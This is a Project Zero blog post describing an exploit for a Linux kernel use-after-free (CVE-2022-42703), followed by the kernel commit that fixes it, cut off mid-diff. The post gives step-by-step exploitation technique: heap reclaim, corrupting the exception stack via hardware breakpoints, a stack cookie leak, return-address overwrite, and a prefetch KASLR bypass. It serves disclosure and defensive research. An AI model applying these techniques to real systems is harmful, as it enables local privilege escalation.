This blog post details an exploit for [CVE-2022-42703](https://bugs.chromium.org/p/project-zero/issues/list?q=label:CVE-2022-42703) (P0 [issue 2351](https://bugs.chromium.org/p/project-zero/issues/detail?id=2351) - Fixed 5 September 2022), a bug Jann Horn found in the Linux kernel's memory management (MM) subsystem that leads to a use-after-free on struct anon\_vma. As the bug is very complex (I certainly struggle to understand it!), a future blog post will describe the bug in full. For the time being, the [issue tracker entry](https://bugs.chromium.org/p/project-zero/issues/detail?id=2351), [this LWN article](https://lwn.net/Articles/383162/) explaining what an anon\_vma is and [the commit](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=7a3ef208e662f) that introduced the bug are great resources in order to gain additional context.

## Setting the scene

Successfully triggering the underlying vulnerability causes folio->mapping to point to a freed anon\_vma object. Calling madvise(..., MADV\_PAGEOUT)can then be used to repeatedly trigger accesses to the freed anon\_vma in folio\_lock\_anon\_vma\_read():

struct anon\_vma \*folio\_lock\_anon\_vma\_read(struct folio \*folio,

       struct rmap\_walk\_control \*rwc)

{

 struct anon\_vma \*anon\_vma = NULL;

 struct anon\_vma \*root\_anon\_vma;

 unsigned long anon\_mapping;

 rcu\_read\_lock();

 anon\_mapping = (unsigned long)READ\_ONCE(folio->mapping);

 if ((anon\_mapping & PAGE\_MAPPING\_FLAGS) != PAGE\_MAPPING\_ANON)

  goto out;

 if (!folio\_mapped(folio))

  goto out;

 // anon\_vma is dangling pointer

 anon\_vma = (struct anon\_vma \*) (anon\_mapping - PAGE\_MAPPING\_ANON);

 // root\_anon\_vma is read from dangling pointer

 root\_anon\_vma = READ\_ONCE(anon\_vma->root);

 if (down\_read\_trylock(&root\_anon\_vma->rwsem)) {

[...]

  if (!folio\_mapped(folio)) { // false

[...]

  }

  goto out;

 }

 if (rwc && rwc->try\_lock) { // true

  anon\_vma = NULL;

  rwc->contended = true;

  goto out;

 }

[...]

out:

 rcu\_read\_unlock();

 return anon\_vma; // return dangling pointer

}

One potential exploit technique is to let the function return the dangling anon\_vma pointer and try to make the subsequent operations do something useful. Instead, we chose to use the down\_read\_trylock() call within the function to corrupt memory at a chosen address, which we can do if we can control the root\_anon\_vma pointer that is read from the freed anon\_vma.

Controlling the root\_anon\_vma pointer means reclaiming the freed anon\_vma with attacker-controlled memory. struct anon\_vma structures are allocated from their own kmalloc cache, which means we cannot simply free one and reclaim it with a different object. Instead we cause the associated anon\_vma slab page to be returned back to the kernel page allocator by following a very similar strategy to the one documented [here](https://googleprojectzero.blogspot.com/2021/10/how-simple-linux-kernel-memory.html). By freeing all the anon\_vma objects on a slab page, then flushing the percpu slab page partial freelist, we can cause the virtual memory previously associated with the anon\_vma to be returned back to the page allocator. We then spray pipe buffers in order to reclaim the freed anon\_vma with attacker controlled memory.

At this point, we’ve discussed how to turn our use-after-free into a down\_read\_trylock() call on an attacker-controlled pointer. The implementation of down\_read\_trylock() is as follows:

struct rw\_semaphore {

 atomic\_long\_t count;

 atomic\_long\_t owner;

 struct optimistic\_spin\_queue osq; /\* spinner MCS lock \*/

 raw\_spinlock\_t wait\_lock;

 struct list\_head wait\_list;

};

...

static inline int \_\_down\_read\_trylock(struct rw\_semaphore \*sem)

{

 long tmp;

 DEBUG\_RWSEMS\_WARN\_ON(sem->magic != sem, sem);

 tmp = atomic\_long\_read(&sem->count);

 while (!(tmp & RWSEM\_READ\_FAILED\_MASK)) {

  if (atomic\_long\_try\_cmpxchg\_acquire(&sem->count, &tmp,

          tmp + RWSEM\_READER\_BIAS)) {

   rwsem\_set\_reader\_owned(sem);

   return 1;

  }

 }

 return 0;

}

It was helpful to emulate the down\_read\_trylock() in unicorn to determine how it behaves when given different sem->count values. Assuming this code is operating on inert and unchanging memory, it will increment sem->count by 0x100 if the 3 least significant bits and the most significant bit are all unset. That means it is difficult to modify a kernel pointer and we cannot modify any non 8-byte aligned values (as they’ll have one or more of the bottom three bits set). Additionally, this semaphore is later unlocked, causing whatever write we perform to be reverted in the imminent future. Furthermore, at this point we don’t have an established strategy for determining the KASLR slide nor figuring out the addresses of any objects we might want to overwrite with our newfound primitive. It turns out that regardless of any randomization the kernel presently has in place, there’s a straightforward strategy for exploiting this bug even given such a constrained arbitrary write.

## Stack corruption…

On x86-64 Linux, when the CPU performs certain interrupts and exceptions, it will swap to a respective stack that is mapped to a static and non-randomized virtual address, with a different stack for the different exception types. A brief documentation of those stacks and their parent structure, the cpu\_entry\_area, can be found [here.](https://docs.kernel.org/x86/pti.html) These stacks are most often used on entry into the kernel from userland, but they’re used for exceptions that happen in kernel mode as well. We’ve recently seen [KCTF](https://google.github.io/kctf/vrp.html) entries where attackers take advantage of the non-randomized cpu\_entry\_area stacks in order to access data at a known virtual address in kernel accessible memory even in the presence of SMAP and KASLR. You could also use these stacks to forge attacker-controlled data at a known kernel virtual address. This works because the attacker task’s general purpose register contents are pushed directly onto this stack when the switch from userland to kernel mode occurs due to one of these exceptions. This also occurs when the kernel itself generates an Interrupt Stack Table exception and swaps to an exception stack - except in that case, kernel GPR’s are pushed instead. These pushed registers are later used to restore kernel state once the exception is handled. In the case of a userland triggered exception, register contents are restored from the task stack.

One example of an IST exception is a DB exception which can be triggered by an attacker via a hardware breakpoint, the associated registers of which are described [here](https://pdos.csail.mit.edu/6.828/2004/readings/i386/s12_02.htm). Hardware breakpoints can be triggered by a variety of different memory access types, namely reads, writes, and instruction fetches. These hardware breakpoints can be set using ptrace(2), and are preserved during kernel mode execution in a task context such as during a syscall. That means that it’s possible for an attacker-set hardware breakpoint to be triggered in kernel mode, e.g. during a copy\_to/from\_user call. The resulting exception will save and restore the kernel context via the aforementioned non-randomized exception stack, and that kernel context is an exceptionally good target for our arbitrary write primitive.

Any of the registers that copy\_to/from\_user is actively using at the time it handles the hardware breakpoint are corruptible by using our arbitrary-write primitive to overwrite their saved values on the exception stack. In this case, the size of the copy\_user call is the intuitive target. The size value is consistently stored in the rcx register, which will be saved at the same virtual address every time the hardware breakpoint is hit. After corrupting this saved register with our arbitrary write primitive, the kernel will restore rcx from the exception stack once it returns back to copy\_to/from\_user. Since rcx defines the number of bytes copy\_user should copy, this corruption will cause the kernel to illicitly copy too many bytes between userland and the kernel.

## …begets stack corruption

The attack strategy starts as follows:

1. Fork a process Y from process X.
2. Process X ptraces process Y, then sets a hardware breakpoint at a known virtual address [addr] in process Y.
3. Process Y makes a large number of calls to uname(2), which calls copy\_to\_user from a kernel stack buffer to [addr]. This causes the kernel to constantly trigger the hardware watchpoint and enter the DB exception handler, using the DB exception stack to save and restore copy\_to\_user state
4. Simultaneously make many arbitrary writes at the known location of the DB exception stack’s saved rcx value, which is Process Y’s copy\_to\_user’s saved length.

[![DB Exception handling while the arbitrary write primitive writes to the CEA stack leads to corruption of the rcx register](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh8tz1hKWNhX-Wy3WfWRQpXpx20G62eGw7d8a_Kw7qQFfGyAgn6jsE9yxyFRR7hgrTW04cZDfp-V1BUnNqbFTXm9rFEktXTvf70fyPgAOk1pMgWZPzLBcRDND3bFObstL6cmPhp0J6nReczPiODwfsjecw_VsmRTp8cgodf-SEb1aQNkfQMQiPnHtt2/w508-h640/image3.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh8tz1hKWNhX-Wy3WfWRQpXpx20G62eGw7d8a_Kw7qQFfGyAgn6jsE9yxyFRR7hgrTW04cZDfp-V1BUnNqbFTXm9rFEktXTvf70fyPgAOk1pMgWZPzLBcRDND3bFObstL6cmPhp0J6nReczPiODwfsjecw_VsmRTp8cgodf-SEb1aQNkfQMQiPnHtt2/s1111/image3.png)

The DB exception stack is used rarely, so it’s unlikely that we corrupt any unexpected kernel state via a spurious DB exception while spamming our arbitrary write primitive. The technique is also racy, but missing the race simply means corrupting stale stack-data. In that case, we simply try again. In my experience, it rarely takes more than a few seconds to win the race successfully.

Upon successful corruption of the length value, the kernel will copy much of the current task’s stack back to userland, including the task-local stack cookie and return addresses. We can subsequently invert our technique and attack a copy\_from\_user call instead. Instead of copying too many bytes from the kernel task stack to userland, we elicit the kernel to copy too many bytes from userland to the kernel task stack! Again we use a syscall, prctl(2), that performs a copy\_from\_user call to a kernel stack buffer. Now by corrupting the length value, we generate a stack buffer overflow condition in this function where none previously existed. Since we’ve already leaked the stack cookie and the KASLR slide, it is trivially easy to bypass both mitigations and overwrite the return address.

[![Image showing that we’ve gained control of the instruction pointer](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiYUmx3piEZB098RyCbjYgbTv18WhcOGwlD3J7HitFqympFWvbVS6iGvsBjdJLgZ5TFc6Y7I4QjugrzV78LCziyAkFMOUgvgDHP_OuPx32gSP5cvrqEV5G2eHqGFzsAHTspIaJ15Dql9ubkcGX6ZQ20NRe9J-cIsLM2y7FEg5CmIICJqoiakOzcYnqT/w640-h420/image2.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiYUmx3piEZB098RyCbjYgbTv18WhcOGwlD3J7HitFqympFWvbVS6iGvsBjdJLgZ5TFc6Y7I4QjugrzV78LCziyAkFMOUgvgDHP_OuPx32gSP5cvrqEV5G2eHqGFzsAHTspIaJ15Dql9ubkcGX6ZQ20NRe9J-cIsLM2y7FEg5CmIICJqoiakOzcYnqT/s555/image2.png)

Completing a ROP chain for the kernel is left as an exercise to the reader.

## Fetching the KASLR slide with prefetch

Upon reporting this bug to the Linux kernel security team, our suggestion was to start randomizing the location of the percpu cpu\_entry\_area (CEA), and consequently the associated exception and syscall entry stacks. This is an effective mitigation against remote attackers but is insufficient to prevent a local attacker from taking advantage. 6 years ago, Daniel Gruss et al. [discovered a new more reliable technique for exploiting the TLB timing side channel in x86 CPU’s](https://gruss.cc/files/prefetch.pdf). Their results demonstrated that prefetch instructions executed in user mode retired at statistically significant different latencies depending on whether the requested virtual address to be prefetched was mapped vs unmapped, even if that virtual address was only mapped in kernel mode. [kPTI](https://docs.kernel.org/x86/pti.html) was helpful in mitigating this side channel, however, most modern CPUs now have innate protection for Meltdown, which kPTI was specifically designed to address, and thusly kPTI (which has significant performance implications) is disabled on modern microarchitectures. That decision means it is once again possible to take advantage of the prefetch side channel to defeat not only KASLR, but also the CPU entry area randomization mitigation, preserving the viability of the CEA stack corruption exploit technique against modern X86 CPUs.

There are surprisingly few fast and reliable examples of this prefetch KASLR bypass technique available in the open source realm, so I made the decision to write one.

## Implementation

The meat of implementing this technique effectively is in serially reading the processor’s time stamp counter before and after performing a prefetch. [Daniel Gruss helpfully provided highly effective and open source code for doing just that.](https://github.com/IAIK/prefetch) The only edit I made (as suggested by Jann Horn) was to swap to using lfence instead of cpuid as the serializing instruction, as cpuid is emulated in VM environments. It also became apparent in practice that there was no need to perform any cache-flushing routines in order to witness the side-channel effect. It is simply enough to time every prefetch attempt.

Generating prefetch timings for all 512 possible KASLR slots yields quite a bit of fuzzy data in need of analyzing. To minimize noise, multiple samples of each tested address are taken, and the minimum value from that set of samples is used in the results as the representative value for an address. On the Tiger Lake CPU this test was primarily performed on, no more than 16 samples per slot were needed to generate exceptionally reliable results. Low-resolution minimum prefetch time slot identification narrows down the area to search in while avoiding false positives for the higher resolution edge-detection code which finds the precise address at which prefetch dramatically drops in run-time. The result of this effort is a PoC which can correctly identify the KASLR slide on my local machine with 99.999% accuracy (95% accuracy in a VM) while running faster than it takes to grep through kallsyms for the kernel base address:

[![Breaking KASLR with Prefecth: Grepping through kallsyms took .077 seconds while using the prefetch technique took .013 seconds](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgE360QpgSL2MstPC7ytC_a22fGUz2uwugoUW0sKHq66aCHk7loOvFCrxAs0ePlNIzvdutTS4wmV5Ilfz2u8MLuQd-n5Z_fSHMcfQdIj-8ooyABpDomHKbxQuCLT3REttBscYj9_F4eGBfKniEm99z4p-ta10N6cXy6nIoGLBV1y8aNn_DiqHBuzVTO/w640-h220/image1.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgE360QpgSL2MstPC7ytC_a22fGUz2uwugoUW0sKHq66aCHk7loOvFCrxAs0ePlNIzvdutTS4wmV5Ilfz2u8MLuQd-n5Z_fSHMcfQdIj-8ooyABpDomHKbxQuCLT3REttBscYj9_F4eGBfKniEm99z4p-ta10N6cXy6nIoGLBV1y8aNn_DiqHBuzVTO/s891/image1.png)

This prefetch code does indeed work to find the locations of the randomized CEA regions in Peter Ziljstra’s proposed patch. However, the journey to that point results in code that demonstrates another deeply significant issue - KASLR is comprehensively compromised on x86 against local attackers, and has been for the past several years, and will be for the indefinite future. There are presently no plans in place to resolve the myriad microarchitectural issues that lead to side channels like this one. Future work is needed in this area in order to preserve the integrity of KASLR, or alternatively, it is probably time to accept that KASLR is no longer an effective mitigation against local attackers and to develop defensive code and mitigations that accept its limitations.

## Conclusion

This exploit demonstrates a highly reliable and agnostic technique that can allow a broad spectrum of uncontrolled arbitrary write primitives to achieve kernel code execution on x86 platforms. While it is possible to mitigate this exploit technique from a remote context, an attacker in a local context can utilize known microarchitectural side-channels to defeat the current mitigations. Additional work in this area might be valuable to continue to make exploitation more difficult, such as performing in-stack randomization so that the stack offset of the saved state changes on every taken IST exception. For now however, this remains a viable and powerful exploit strategy on x86 Linux.

Posted by

[Google Project Zero](https://www.blogger.com/profile/08975904405228580347 "author profile")

at

[11:04 AM](https://googleprojectzero.blogspot.com/2022/12/exploiting-CVE-2022-42703-bringing-back-the-stack-attack.html "permanent link")

[No comments:](https://googleprojectzero.blogspot.com/2022/12/exploiting-CVE-2022-42703-bringing-back-the-stack-attack.html#comment-form)

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=4838136820032157985&postID=2515628030502752973&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=4838136820032157985&postID=2515628030502752973&target=email "Email This")[BlogThis!](https://www.blogger.com/share-post.g?blogID=4838136820032157985&postID=2515628030502752973&target=blog "BlogThis!")[Share to X](https://www.blogger.com/share-post.g?blogID=4838136820032157985&postID=2515628030502752973&target=twitter "Share to X")[Share to Facebook](https://www.blogger.com/share-post.g?blogID=4838136820032157985&postID=2515628030502752973&target=facebook "Share to Facebook")[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=4838136820032157985&postID=2515628030502752973&target=pinterest "Share to Pinterest")

[Newer Posts](https://googleprojectzero.blogspot.com/search?updated-max=2023-01-19T09:33:00-08:00&max-results=1&reverse-paginate=true "Newer Posts")

[Older Posts](https://googleprojectzero.blogspot.com/search?updated-max=2022-12-08T11:04:00-08:00&max-results=1 "Older Posts")

[Home](https://googleprojectzero.blogspot.com/)

Subscribe to:
[Posts (Atom)](https://googleprojectzero.blogspot.com/feeds/posts/default)

## Search This Blog

|  |  |
| --- | --- |

## Pages

* [About Project Zero](https://googleprojectzero.blogspot.com/p/about-project-zero.html)
* [Working at Project Zero](https://googleprojectzero.blogspot.com/p/working-at-project-zero.html)
* [0day "In the Wild"](https://googleprojectzero.blogspot.com/p/0day.html)
* [0day Exploit Root Cause Analyses](https://googleprojectzero.github.io/0days-in-the-wild/rca.html)
* [Vulnerability Disclosure FAQ](https://googleprojectzero.blogspot.com/p/vulnerability-disclosure-faq.html)

## Archives

* ►
  [2024](https://googleprojectzero.blogspot.com/2024/)
  (12)
  + ►
    [December](https://googleprojectzero.blogspot.com/2024/12/)
    (3)
  + ►
    [November](https://googleprojectzero.blogspot.com/2024/11/)
    (2)
  + ►
    [October](https://googleprojectzero.blogspot.com/2024/10/)
    (2)
  + ►
    [June](https://googleprojectzero.blogspot.com/2024/06/)
    (3)
  + ►
    [April](https://googleprojectzero.blogspot.com/2024/04/)
    (2)

* ►
  [2023](https://googleprojectzero.blogspot.com/2023/)
  (11)
  + ►
    [November](https://googleprojectzero.blogspot.com/2023/11/)
    (1)
  + ►
    [October](https://googleprojectzero.blogspot.com/2023/10/)
    (1)
  + ►
    [September](https://googleprojectzero.blogspot.com/2023/09/)
    (1)
  + ►
    [August](https://googleprojectzero.blogspot.com/2023/08/)
    (4)
  + ►
    [April](https://googleprojectzero.blogspot.com/2023/04/)
    (1)
  + ►
    [March](https://googleprojectzero.blogspot.com/2023/03/)
    (1)
  + ►
    [January](https://googleprojectzero.blogspot.com/2023/01/)
    (2)

* ▼
  [2022](https://googleprojectzero.blogspot.com/2022/)
  (17)
  + ▼
    [December](https://googleprojectzero.blogspot.com/2022/12/)
    (1)
    - [Exploiting CVE-2022-42703 - Bringing back the stac...](https://googleprojectzero.blogspot.com/2022/12/exploiting-CVE-2022-42703-bringing-back-the-stack-attack.html)
  + ►
    [November](https://googleprojectzero.blogspot.com/2022/11/)
    (3)
  + ►
    [October](https://googleprojectzero.blogspot.com/2022/10/)
    (1)
  + ►
    [August](https://googleprojectzero.blogspot.com/2022/08/)
    (1)
  + ►
    [June](https://googleprojectzero.blogspot.com/2022/06/)
    (3)
  + ►
    [May](https://googleprojectzero.blogspot.com/2022/05/)
    (1)
  + ►
    [April](https://googleprojectzero.blogspot.com/2022/04/)
    (3)
  + ►
    [March](https://googleprojectzero.blogspot.com/2022/03/)
    (2)
  + ►
    [February](https://googleprojectzero.blogspot.com/2022/02/)
    (1)
  + ►
    [January](https://googleprojectzero.blogspot.com/2022/01/)
    (1)

* ►
  [2021](https://googleprojectzero.blogspot.com/2021/)
  (24)
  + ►
    [December](https://googleprojectzero.blogspot.com/2021/12/)
    (2)
  + ►
    [October](https://googleprojectzero.blogspot.com/2021/10/)
    (3)
  + ►
    [September](https://googleprojectzero.blogspot.com/2021/09/)
    (1)
  + ►
    [August](https://googleprojectzero.blogspot.com/2021/08/)
    (1)
  + ►
    [June](https://googleprojectzero.blogspot.com/2021/06/)
    (1)
  + ►
    [May](https://googleprojectzero.blogspot.com/2021/05/)
    (1)
  + ►
    [April](https://googleprojectzero.blogspot.com/2021/04/)
    (3)
  + ►
    [March](https://googleprojectzero.blogspot.com/2021/03/)
    (1)
  + ►
    [February](https://googleprojectzero.blogspot.com/2021/02/)
    (1)
  + ►
    [January](https://googleprojectzero.blogspot.com/2021/01/)
    (10)

* ►
  [2020](https://googleprojectzero.blogspot.com/2020/)
  (36)
  + ►
    [December](https://googleprojectzero.blogspot.com/2020/12/)
    (2)
  + ►
    [November](https://googleprojectzero.blogspot.com/2020/11/)
    (1)
  + ►
    [October](https://googleprojectzero.blogspot.com/2020/10/)
    (2)
  + ►
    [September](https://googleprojectzero.blogspot.com/2020/09/)
    (4)
  + ►
    [August](https://googleprojectzero.blogspot.com/2020/08/)
    (5)
  + ►
    [July](https://googleprojectzero.blogspot.com/2020/07/)
    (8)
  + ►
    [June](https://googleprojectzero.blogspot.com/2020/06/)
    (2)
  + ►
    [April](https://googleprojectzero.blogspot.com/2020/04/)
    (3)
  + ►
    [February](https://googleprojectzero.blogspot.com/2020/02/)
    (4)
  + ►
    [January](https://googleprojectzero.blogspot.com/2020/01/)
    (5)

* ►
  [2019](https://googleprojectzero.blogspot.com/2019/)
  (27)
  + ►
    [December](https://googleprojectzero.blogspot.com/2019/12/)
    (2)
  + ►
    [November](https://googleprojectzero.blogspot.com/2019/11/)
    (1)
  + ►
    [October](https://googleprojectzero.blogspot.com/2019/10/)
    (2)
  + ►
    [September](https://googleprojectzero.blogspot.com/2019/09/)
    (1)
  + ►
    [August](https://googleprojectzero.blogspot.com/2019/08/)
    (11)
  + ►
    [May](https://googleprojectzero.blogspot.com/2019/05/)
    (1)
  + ►
    [April](https://googleprojectzero.blogspot.com/2019/04/)
    (3)
  + ►
    [March](https://googleprojectzero.blogspot.com/2019/03/)
    (2)
  + ►
    [February](https://googleprojectzero.blogspot.com/2019/02/)
    (2)
  + ►
    [January](https://googleprojectzero.blogspot.com/2019/01/)
    (2)

* ►
  [2018](https://googleprojectzero.blogspot.com/2018/)
  (22)
  + ►
    [December](https://googleprojectzero.blogspot.com/2018/12/)
    (7)
  + ►
    [November](https://googleprojectzero.blogspot.com/2018/11/)
    (1)
  + ►
    [October](https://googleprojectzero.blogspot.com/2018/10/)
    (4)
  + ►
    [September](https://googleprojectzero.blogspot.com/2018/09/)
    (2)
  + ►
    [August](https://googleprojectzero.blogspot.com/2018/08/)
    (3)
  + ►
    [July](https://googleprojectzero.blogspot.com/2018/07/)
    (1)
  + ►
    [June](https://googleprojectzero.blogspot.com/2018/06/)
    (1)
  + ►
    [May](https://googleprojectzero.blogspot.com/2018/05/)
    (1)
  + ►
    [April](https://googleprojectzero.blogspot.com/2018/04/)
    (1)
  + ►
    [January](https://googleprojectzero.blogspot.com/2018/01/)
    (1)

* ►
  [2017](https://googleprojectzero.blogspot.com/2017/)
  (19)
  + ►
    [December](https://googleprojectzero.blogspot.com/2017/12/)
    (1)
  + ►
    [October](https://googleprojectzero.blogspot.com/2017/10/)
    (3)
  + ►
    [September](https://googleprojectzero.blogspot.com/2017/09/)
    (2)
  + ►
    [August](https://googleprojectzero.blogspot.com/2017/08/)
    (2)
  + ►
    [July](https://googleprojectzero.blogspot.com/2017/07/)
    (1)
  + ►
    [May](https://googleprojectzero.blogspot.com/2017/05/)
    (1)
  + ►
    [April](https://googleprojectzero.blogspot.com/2017/04/)
    (6)
  + ►
    [March](https://googleprojectzero.blogspot.com/2017/03/)
    (1)
  + ►
    [February](https://googleprojectzero.blogspot.com/2017/02/)
    (2)

* ►
  [2016](https://googleprojectzero.blogspot.com/2016/)
  (17)
  + ►
    [December](https://googleprojectzero.blogspot.com/2016/12/)
    (2)
  + ►
    [November](https://googleprojectzero.blogspot.com/2016/11/)
    (1)
  + ►
    [October](https://googleprojectzero.blogspot.com/2016/10/)
    (1)
  + ►
    [September](https://googleprojectzero.blogspot.com/2016/09/)
    (2)
  + ►
    [August](https://googleprojectzero.blogspot.com/2016/08/)
    (1)
  + ►
    [July](https://googleprojectzero.blogspot.com/2016/07/)
    (1)
  + ►
    [June](https://googleprojectzero.blogspot.com/2016/06/)
    (3)
  + ►
    [March](https://googleprojectzero.blogspot.com/2016/03/)
    (3)
  + ►
    [February](https://googleprojectzero.blogspot.com/2016/02/)
    (2)
  + ►
    [January](https://googleprojectzero.blogspot.com/2016/01/)
    (1)

* ►
  [2015](https://googleprojectzero.blogspot.com/2015/)
  (33)
  + ►
    [December](https://googleprojectzero.blogspot.com/2015/12/)
    (2)
  + ►
    [November](https://googleprojectzero.blogspot.com/2015/11/)
    (2)
  + ►
    [October](https://googleprojectzero.blogspot.com/2015/10/)
    (1)
  + ►
    [September](https://googleprojectzero.blogspot.com/2015/09/)
    (4)
  + ►
    [August](https://googleprojectzero.blogspot.com/2015/08/)
    (6)
  + ►
    [July](https://googleprojectzero.blogspot.com/2015/07/)
    (5)
  + ►
    [June](https://googleprojectzero.blogspot.com/2015/06/)
    (4)
  + ►
    [May](https://googleprojectzero.blogspot.com/2015/05/)
    (1)
  + ►
    [April](https://googleprojectzero.blogspot.com/2015/04/)
    (1)
  + ►
    [March](https://googleprojectzero.blogspot.com/2015/03/)
    (2)
  + ►
    [February](https://googleprojectzero.blogspot.com/2015/02/)
    (3)
  + ►
    [January](https://googleprojectzero.blogspot.com/2015/01/)
    (2)

* ►
  [2014](https://googleprojectzero.blogspot.com/2014/)
  (11)
  + ►
    [December](https://googleprojectzero.blogspot.com/2014/12/)
    (1)
  + ►
    [November](https://googleprojectzero.blogspot.com/2014/11/)
    (2)
  + ►
    [October](https://googleprojectzero.blogspot.com/2014/10/)
    (2)
  + ►
    [September](https://googleprojectzero.blogspot.com/2014/09/)
    (1)
  + ►
    [August](https://googleprojectzero.blogspot.com/2014/08/)
    (2)
  + ►
    [July](https://googleprojectzero.blogspot.com/2014/07/)
    (3)

|  |  |
| --- | --- |

|  |  |
| --- | --- |

Powered by [Blogger](https://www.blogger.com).



=== Content from git.kernel.org_0b0afcff_20250115_101102.html ===


| [cgit logo](/) | [index](/) : [kernel/git/torvalds/linux.git](/pub/scm/linux/kernel/git/torvalds/linux.git/) | for-next master vsnprintf |
| --- | --- | --- |
| Linux kernel source tree | Linus Torvalds |

| [about](/pub/scm/linux/kernel/git/torvalds/linux.git/about/)[summary](/pub/scm/linux/kernel/git/torvalds/linux.git/)[refs](/pub/scm/linux/kernel/git/torvalds/linux.git/refs/?id=2555283eb40df89945557273121e9393ef9b542b)[log](/pub/scm/linux/kernel/git/torvalds/linux.git/log/)[tree](/pub/scm/linux/kernel/git/torvalds/linux.git/tree/?id=2555283eb40df89945557273121e9393ef9b542b)[commit](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=2555283eb40df89945557273121e9393ef9b542b)[diff](/pub/scm/linux/kernel/git/torvalds/linux.git/diff/?id=2555283eb40df89945557273121e9393ef9b542b)[stats](/pub/scm/linux/kernel/git/torvalds/linux.git/stats/) | log msg author committer range |
| --- | --- |

**diff options**

|  | |
| --- | --- |
| context: | 12345678910152025303540 |
| space: | includeignore |
| mode: | unifiedssdiffstat only |
|  |  |

| author | Jann Horn <jannh@google.com> | 2022-08-31 19:06:00 +0200 |
| --- | --- | --- |
| committer | Linus Torvalds <torvalds@linux-foundation.org> | 2022-08-31 15:45:10 -0700 |
| commit | [2555283eb40df89945557273121e9393ef9b542b](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=2555283eb40df89945557273121e9393ef9b542b) ([patch](/pub/scm/linux/kernel/git/torvalds/linux.git/patch/?id=2555283eb40df89945557273121e9393ef9b542b)) | |
| tree | [ef4abf2ce0cf865cd5a07e5875f0e17853a51a00](/pub/scm/linux/kernel/git/torvalds/linux.git/tree/?id=2555283eb40df89945557273121e9393ef9b542b) | |
| parent | [c5e4d5e99162ba8025d58a3af7ad103f155d2df7](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=c5e4d5e99162ba8025d58a3af7ad103f155d2df7) ([diff](/pub/scm/linux/kernel/git/torvalds/linux.git/diff/?id=2555283eb40df89945557273121e9393ef9b542b&id2=c5e4d5e99162ba8025d58a3af7ad103f155d2df7)) | |
| download | [linux-2555283eb40df89945557273121e9393ef9b542b.tar.gz](/pub/scm/linux/kernel/git/torvalds/linux.git/snapshot/linux-2555283eb40df89945557273121e9393ef9b542b.tar.gz) | |

mm/rmap: Fix anon\_vma->degree ambiguity leading to double-reuseanon\_vma->degree tracks the combined number of child anon\_vmas and VMAs
that use the anon\_vma as their ->anon\_vma.
anon\_vma\_clone() then assumes that for any anon\_vma attached to
src->anon\_vma\_chain other than src->anon\_vma, it is impossible for it to
be a leaf node of the VMA tree, meaning that for such VMAs ->degree is
elevated by 1 because of a child anon\_vma, meaning that if ->degree
equals 1 there are no VMAs that use the anon\_vma as their ->anon\_vma.
This assumption is wrong because the ->degree optimization leads to leaf
nodes being abandoned on anon\_vma\_clone() - an existing anon\_vma is
reused and no new parent-child relationship is created. So it is
possible to reuse an anon\_vma for one VMA while it is still tied to
another VMA.
This is an issue because is\_mergeable\_anon\_vma() and its callers assume
that if two VMAs have the same ->anon\_vma, the list of anon\_vmas
attached to the VMAs is guaranteed to be the same. When this assumption
is violated, vma\_merge() can merge pages into a VMA that is not attached
to the corresponding anon\_vma, leading to dangling page->mapping
pointers that will be dereferenced during rmap walks.
Fix it by separately tracking the number of child anon\_vmas and the
number of VMAs using the anon\_vma as their ->anon\_vma.
Fixes: 7a3ef208e662 ("mm: prevent endless growth of anon\_vma hierarchy")
Cc: stable@kernel.org
Acked-by: Michal Hocko <mhocko@suse.com>
Acked-by: Vlastimil Babka <vbabka@suse.cz>
Signed-off-by: Jann Horn <jannh@google.com>
Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>
[Diffstat](/pub/scm/linux/kernel/git/torvalds/linux.git/diff/?id=2555283eb40df89945557273121e9393ef9b542b)

| -rw-r--r-- | [include/linux/rmap.h](/pub/scm/linux/kernel/git/torvalds/linux.git/diff/include/linux/rmap.h?id=2555283eb40df89945557273121e9393ef9b542b) | 7 | |  |  |  | | --- | --- | --- | |
| --- | --- | --- | --- | --- | --- | --- |
| -rw-r--r-- | [mm/rmap.c](/pub/scm/linux/kernel/git/torvalds/linux.git/diff/mm/rmap.c?id=2555283eb40df89945557273121e9393ef9b542b) | 29 | |  |  |  | | --- | --- | --- | |

2 files changed, 21 insertions, 15 deletions

| diff --git a/include/linux/rmap.h b/include/linux/rmap.hindex bf80adca980b96..b89b4b86951f85 100644--- a/[include/linux/rmap.h](/pub/scm/linux/kernel/git/torvalds/linux.git/tree/include/linux/rmap.h?id=c5e4d5e99162ba8025d58a3af7ad103f155d2df7)+++ b/[include/linux/rmap.h](/pub/scm/linux/kernel/git/torvalds/linux.git/tree/include/linux/rmap.h?id=2555283eb40df89945557273121e9393ef9b542b)@@ -41,12 +41,15 @@ struct anon\_vma { atomic\_t refcount;  /\*- \* Count of child anon\_vmas and VMAs which points to this anon\_vma.+ \* Count of child anon\_vmas. Equals to the count of all anon\_vmas that+ \* have ->parent pointing to this one, including itself. \* \* This counter is used for making decision about reusing anon\_vma \* instead of forking new one. See comments in function anon\_vma\_clone. \*/- unsigned degree;+ unsigned long num\_children;+ /\* Count of VMAs whose ->anon\_vma pointer points to this object. \*/+ unsigned long num\_active\_vmas;  struct anon\_vma \*parent; /\* Parent of this anon\_vma \*/ diff --git a/mm/rmap.c b/mm/rmap.cindex edc06c52bc82e7..93d5a6f793d204 100644--- a/[mm/rmap.c](/pub/scm/linux/kernel/git/torvalds/linux.git/tree/mm/rmap.c?id=c5e4d5e99162ba8025d58a3af7ad103f155d2df7)+++ b/[mm/rmap.c](/pub/scm/linux/kernel/git/torvalds/linux.git/tree/mm/rmap.c?id=2555283eb40df89945557273121e9393ef9b542b)@@ -93,7 +93,8 @@ static inline struct anon\_vma \*anon\_vma\_alloc(void) anon\_vma = kmem\_cache\_alloc(anon\_vma\_cachep, 